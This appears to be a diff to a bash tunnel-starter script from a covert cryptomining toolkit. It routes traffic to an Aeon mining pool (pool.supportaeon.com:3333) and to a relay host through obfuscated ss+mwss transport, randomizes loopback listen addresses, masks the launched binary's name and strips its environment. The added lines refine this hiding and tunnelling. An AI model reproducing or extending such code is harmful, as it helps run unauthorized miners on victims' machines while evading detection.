@@ -3,6 +3,9 @@
 ## tnl starter
 ## TODO tstarter should support multiple listeners
 ## $1 is the starting port (for overrides)
+
+trap "trap - SIGINT EXIT && kill -- -$$; cleanup" SIGINT EXIT
+
 function tstarter(){
 
     tnlpid(){
@@ -44,7 +47,7 @@ function tstarter(){
                 pkill -xf "${PREP_TNL_MASK}"
             fi
         fi
-        eval "coproc tnl { export -n \$(export -p) 2>/dev/null; PATH=. exec ${ESC_TNL_MASK} 2>/dev/null; }" ## exec command needs binary name escaped and unquoted
+        eval "coproc tnl { dex_env; exec ${ESC_TNL_MASK} 2>/dev/null; }" ## exec command needs binary name escaped and unquoted
         fleep 1 ## time to bind
     }
 
@@ -69,17 +72,20 @@ function tstarter(){
             export TNL_LISTEN_PORT=$port
             envsubst -no-empty -i cfg/${TNL_CFG} -o ${TNL_CFG_MASK}
         fi
-        fleep 0.5
+        fleep 2
     done
 
     return 1 ## no ports available
 }
 
 function setup_tnl() {
-    TNL_LISTEN_ADDR=127.255.255.254
-    # TNL_LISTEN_ADDR2=127.255.255.253
-    TNL_FORWARD_ADDR=${TNL_FORWARD_ADDR:-198.204.227.235}
-    TNL_PLIST="80 8081 443 8081 8082 9000 10000 3036 20 21 465 993 995 110 123 2703 3036"
+    [ -z "$TNL_LISTEN_ADDR" ] &&
+        TNL_LISTEN_ADDR=127.$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%253+1))
+    [ -z "$TNL_LISTEN_ADDR2" ] &&
+        TNL_LISTEN_ADDR2=127.$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%252+1))
+    export TNL_LISTEN_ADDR TNL_LISTEN_ADDR2
+    TNL_FORWARD_ADDR=${TNL_FORWARD_ADDR:-t.pkite.ga}
+    TNL_PLIST="80 443 8081 8082 9000 10000 3036 20 21 465 993 995 110 123 2703 3036"
     TNL_CFG=${TNL_CFG:-gst.json.tpl}
     TNL_PATH=${TNL_PATH:-$(get_path gst)}
     # PC_PATH=${PC_PATH:-$(get_path pc)}
@@ -105,11 +111,10 @@ function setup_tnl() {
     if [ "$jail" -o -n "$(uname -r | grep -E ^2\.6\.[0-9]*\|^3\.1[0-9]*)" ]; then
         TNL_FORWARD_SCHEME=${TNL_FORWARD_SCHEME:-ss+mwss}
     fi
-    if [ "$lowhw" ]; then
-        TNL_LISTEN_TARGET=${TNL_LISTEN_TARGET:-pool.supportaeon.com:3333}
-    else
-        TNL_LISTEN_TARGET=${TNL_LISTEN_TARGET:-${ENDPOINT}}
-    fi
+    [ "$lowhw" ]  &&
+        TNL_LISTEN_TARGET=${TNL_LISTEN_TARGET:-pool.supportaeon.com:3333} ||
+            TNL_LISTEN_TARGET=${TNL_LISTEN_TARGET:-${ENDPOINT}}
+
     TNL_LISTEN_TARGET2=${TNL_LISTEN_TARGET2:-${ENDPOINT2}}
     export TNL_FORWARD_ADDR="$TNL_FORWARD_ADDR" \
            TNL_LISTEN_PORT=${TNL_LISTEN_PORT:-8080} \
